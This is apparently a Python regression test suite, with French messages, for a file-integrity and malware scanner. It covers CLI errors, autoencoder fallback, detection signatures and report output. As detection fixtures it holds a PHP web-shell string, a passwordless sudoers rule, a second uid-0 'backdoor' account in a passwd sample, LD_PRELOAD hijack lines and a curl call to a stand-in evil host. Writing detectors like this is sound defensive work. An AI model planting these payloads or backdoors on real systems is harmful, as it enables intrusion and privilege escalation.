"""Régressions sur les défauts corrigés (CLI, signatures, rapport, modèle)."""

import json
import os
import random
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from sentinel.anomaly import score_autoencoder
from sentinel.integrity import diff_against_baseline, make_baseline
from sentinel.models import AnomalyScore, IntegrityDiff, Report
from sentinel.neural import Autoencoder, AutoencoderScorer
from sentinel.reporting import render_json, render_text
from sentinel.scanner import scan_folder
from sentinel.signatures import Sig0009, Sig0015, Sig0016

ROOT = Path(__file__).resolve().parents[1]
BENIGN = ROOT / "tests" / "fixtures" / "benign"
PHP = b"<?php eval(base64_decode($_GET['x'])); ?>"


def _run(*args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, "-m", "sentinel", *args],
        cwd=ROOT,
        check=False,
        capture_output=True,
        text=True,
        env={**os.environ, "LC_ALL": "C.UTF-8"},
    )


def _anomaly(path: str, score: float) -> AnomalyScore:
    return AnomalyScore(
        path=path,
        score=score,
        entropy=1.0,
        max_line_len=10,
        nonprintable_ratio=0.0,
        shell_metachar_ratio=0.0,
        avg_line_len=10.0,
    )


class TestCliErrors(unittest.TestCase):
    def test_missing_directory_exits_2(self) -> None:
        missing = "/tmp/sentinel-no-such-dir-xyz"
        result = _run("scan", missing, "--format", "json")
        self.assertEqual(result.returncode, 2, result.stderr)
        self.assertIn("introuvable", result.stderr)
        self.assertEqual(result.stdout, "")
        with tempfile.TemporaryDirectory() as td:
            out = Path(td) / "baseline.json"
            result = _run("baseline", missing, "--out", str(out))
            self.assertEqual(result.returncode, 2, result.stderr)
            self.assertIn("introuvable", result.stderr)
            self.assertEqual(result.stdout, "")
            self.assertFalse(out.exists())

    def test_file_instead_of_directory_exits_2(self) -> None:
        result = _run("scan", "README.md", "--format", "json")
        self.assertEqual(result.returncode, 2, result.stderr)
        self.assertIn("Pas un dossier", result.stderr)
        self.assertEqual(result.stdout, "")

    def test_train_on_binaries_does_not_save_a_model(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            folder = Path(td) / "bin"
            folder.mkdir()
            (folder / "a.bin").write_bytes(b"\x00" * 400)
            out = Path(td) / "model.json"
            result = _run("train", str(folder), "--out", str(out), "--epochs", "2")
            self.assertEqual(result.returncode, 2, result.stderr)
            self.assertIn("texte lisible", result.stderr)
            self.assertFalse(out.exists())


class TestNeuralFallbackAndSeed(unittest.TestCase):
    def test_neural_without_model_falls_back(self) -> None:
        scores = score_autoencoder([BENIGN / "utils.py"])
        self.assertEqual(len(scores), 1)
        self.assertEqual(scores[0].method, "autoencoder:untrained")

    def test_missing_model_file_falls_back(self) -> None:
        result = _run(
            "scan",
            str(BENIGN),
            "--anomaly",
            "--neural",
            "--model",
            "/tmp/sentinel-no-such-model.json",
            "--format",
            "json",
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("introuvable", result.stderr)
        payload = json.loads(result.stdout)
        self.assertTrue(payload["anomalies"])
        self.assertTrue(all(a["method"] == "autoencoder:untrained" for a in payload["anomalies"]))

    def test_unreadable_model_falls_back(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            model = Path(td) / "model.json"
            model.write_text("{not json")
            result = _run(
                "scan",
                str(BENIGN),
                "--anomaly",
                "--neural",
                "--model",
                str(model),
                "--format",
                "json",
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertIn("illisible", result.stderr)
            payload = json.loads(result.stdout)
            self.assertEqual(payload["anomalies"][0]["method"], "autoencoder:untrained")

    def test_same_seed_reproduces_the_model(self) -> None:
        files = [p for p in BENIGN.glob("*") if p.is_file()]

        def once(seed: int) -> tuple[list[float], list[float]]:
            scorer = AutoencoderScorer(model=Autoencoder(rng=random.Random(seed)))
            losses = scorer.train(files, epochs=4, lr=5e-3)
            return losses, list(scorer.model.W.b4)

        random.seed(1)
        first = once(123)
        random.seed(99)
        random.random()
        second = once(123)
        self.assertEqual(first[0], second[0])
        self.assertEqual(first[1], second[1])


class TestSignatureHoles(unittest.TestCase):
    def test_sudoers_d_and_real_root(self) -> None:
        rule = Sig0015()
        sudo = "bob ALL=(ALL) NOPASSWD: ALL\n"
        self.assertEqual(len(list(rule.scan("etc/sudoers.d/99-local", sudo))), 1)
        self.assertEqual(len(list(rule.scan("sudoers", sudo))), 1)
        passwd = "root:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0:owned:/root:/bin/bash\n"
        hits = list(rule.scan("etc/passwd", passwd))
        self.assertEqual([(h.line, h.evidence) for h in hits], [(2, "backdoor uid=0")])

    def test_markdown_langtags_are_not_shell_injection(self) -> None:
        rule = Sig0009()
        for line in ("`sh`", "`bash`", "run `sh` now", "use `bash` here"):
            self.assertEqual(list(rule.scan("doc.md", line + "\n")), [], line)
        hits = list(rule.scan("doc.md", "ok `sh` && curl http://evil.example/x\n"))
        self.assertEqual(len(hits), 1)
        self.assertIn("curl", hits[0].evidence)

    def test_ld_preload_quotes_and_path_list(self) -> None:
        rule = Sig0016()
        flagged = [
            "export LD_PRELOAD=/tmp/evil.so",
            'export LD_PRELOAD="/tmp/evil.so"',
            "export LD_PRELOAD='/tmp/evil.so'",
            "export LD_LIBRARY_PATH=/usr/lib:/tmp",
        ]
        for line in flagged:
            self.assertTrue(list(rule.scan("a.sh", line + "\n")), line)
        clean = [
            "export LD_PRELOAD=/var/tmp/evil.so",
            "LD_PRELOAD=/tmpfoo/x.so",
            "LD_PRELOAD=./tmp/evil.so",
        ]
        for line in clean:
            self.assertFalse(list(rule.scan("a.sh", line + "\n")), line)


class TestHiddenPayloads(unittest.TestCase):
    def _scan_bytes(self, name: str, data: bytes) -> list[str]:
        with tempfile.TemporaryDirectory() as td:
            folder = Path(td)
            (folder / name).write_bytes(data)
            report = scan_folder(folder)
            return [f.rule_id for f in report.findings]

    def test_nul_prefix_still_scans(self) -> None:
        self.assertIn("SIG-0001", self._scan_bytes("w.php", b"\x00" + PHP))

    def test_non_utf8_still_scans(self) -> None:
        self.assertIn("SIG-0001", self._scan_bytes("w.php", PHP + b"\xff\xfe"))

    def test_file_over_one_megabyte_still_scans(self) -> None:
        data = b"A" * 1_100_000 + b"\n" + PHP + b"\n"
        self.assertIn("SIG-0001", self._scan_bytes("w.php", data))

    def test_mostly_nul_binary_is_still_ignored(self) -> None:
        data = b"\x00" * 1000 + PHP
        self.assertEqual(self._scan_bytes("w.php", data), [])


class TestReportShape(unittest.TestCase):
    def test_anomaly_paths_are_relative_to_the_scan_root(self) -> None:
        report = scan_folder(BENIGN, with_anomaly=True)
        names = {p.name for p in BENIGN.iterdir() if p.is_file()}
        self.assertEqual({a.path for a in report.anomalies}, names)

    def test_text_hides_low_scores_and_json_keeps_them(self) -> None:
        report = Report(
            anomalies=[
                _anomaly(f"f{i}.txt", score)
                for i, score in enumerate([100, 90, 80, 70, 61, 60, 59, 40, 10])
            ],
            top_n=3,
        )
        text = render_text(report)
        self.assertIn("f0.txt", text)
        self.assertIn("f2.txt", text)
        self.assertNotIn("f3.txt", text)
        self.assertNotIn("f6.txt", text)
        payload = json.loads(render_json(report))
        self.assertEqual(len(payload["anomalies"]), 9)

    def test_json_lists_integrity_paths(self) -> None:
        report = Report(integrity=IntegrityDiff(added=["a"], modified=["b"], mode_changed=["c"]))
        payload = json.loads(render_json(report))
        self.assertEqual(payload["integrity"]["added"], ["a"])
        self.assertEqual(payload["integrity"]["modified"], ["b"])
        self.assertEqual(payload["integrity"]["mode_changed"], ["c"])
        self.assertEqual(payload["integrity_counts"]["added"], 1)

    def test_content_and_mode_changes_are_both_reported(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            target = Path(td) / "data"
            target.mkdir()
            f = target / "a.txt"
            f.write_text("a\n")
            ref = make_baseline(target)
            f.write_text("b\n", newline="\n")
            if os.name == "nt":
                # chmod ne change que l'attribut lecture seule.
                os.chmod(f, stat.S_IREAD)
            else:
                os.chmod(f, 0o755)
            diff = diff_against_baseline(make_baseline(target), ref)
            self.assertEqual(diff.modified, ["a.txt"])
            self.assertEqual(diff.mode_changed, ["a.txt"])


if __name__ == "__main__":
    unittest.main()
